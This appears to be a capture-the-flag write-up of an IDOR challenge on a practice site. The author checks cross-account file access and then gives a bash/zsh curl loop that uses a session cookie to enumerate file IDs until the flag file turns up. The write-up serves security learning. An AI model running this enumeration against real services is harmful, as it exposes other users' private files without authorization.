---
tags:
  - idor
---
https://pwnbox.io/challenges/cloud-stash
in this one, we first try to verify the idor. so i created an account and upload some thing when tried to download we get some thing like this in the requests:
`https://session.pwnbox-lab.com/files/84/download`
to verify the idor, i created a second account and with the credential of the second account send a request to download file with id 84, the file that owned by the first account, and boom we got the file, so there is an idor.
then i tried few id but get nothing so i used this zsh /bash command :
```zsh
for id in {1..82}; do
  http_code=$(curl -s -o /dev/null -w '%{http_code}' \
    -H 'Cookie: connect.sid=your-cookie' \
    "https://session.pwnbox-lab.com/files/$id/download")
  printf '%s %s\n' "$id" "$http_code"
done
```
and we got it in id 47, and got the flag.